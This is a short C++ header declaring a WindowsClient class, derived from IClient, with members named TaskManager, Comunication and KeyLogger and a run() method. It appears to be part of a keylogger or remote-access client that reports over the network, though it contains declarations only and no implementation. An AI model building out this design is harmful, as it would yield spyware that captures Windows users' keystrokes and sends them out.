#pragma once

#include	"IClient.h"

class WindowsClient : public IClient
{
public:
	WindowsClient();
	virtual ~WindowsClient();

public:
	bool			run();

private:
	TaskManager		taskManager;
	Comunication	network;
	KeyLogger		keylogger;
};